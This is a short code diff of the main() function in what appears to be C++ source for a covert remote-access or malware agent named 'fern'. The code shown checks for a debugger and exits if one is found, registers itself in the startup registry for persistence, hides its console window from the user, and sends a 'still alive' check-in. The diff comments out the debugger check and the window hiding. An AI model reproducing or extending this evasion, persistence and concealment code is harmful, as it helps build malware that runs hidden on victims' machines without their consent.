@@ -36,16 +36,17 @@ std::vector<std::string> split_string(const std::string& s, const std::string& d
 
 
 int main() {
+    /*
     if(DebuggerPresence()){
         exit(1);
     }
-    /*
+
     if(!AddToStartupRegistry("asd")){
         exit(2);
     }
     */
     //Hiding console from user
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
     //Initializing agent
     agent fern;
     //register string, send to tell us that the agent is alive and working
